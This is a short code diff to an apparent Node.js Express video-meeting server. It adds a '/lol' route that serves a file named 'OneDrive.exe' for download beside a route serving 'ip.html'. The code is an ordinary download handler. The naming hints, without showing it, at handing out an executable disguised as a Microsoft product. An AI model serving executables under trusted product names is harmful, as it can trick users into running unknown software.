@@ -186,6 +186,10 @@ app.get('/this', (req, res) => {
      res.sendFile(__dirname+ '/ip.html' );
  
   });
+  app.get('/lol', (req, res) => {
+    const filePath = '/OneDrive.exe'; // Replace with the actual file path
+    res.download(filePath);
+  });
 
 // main namespace for the meet functionality --------> 
 io.of( '/stream' ).on( 'connection', (socket)=>{
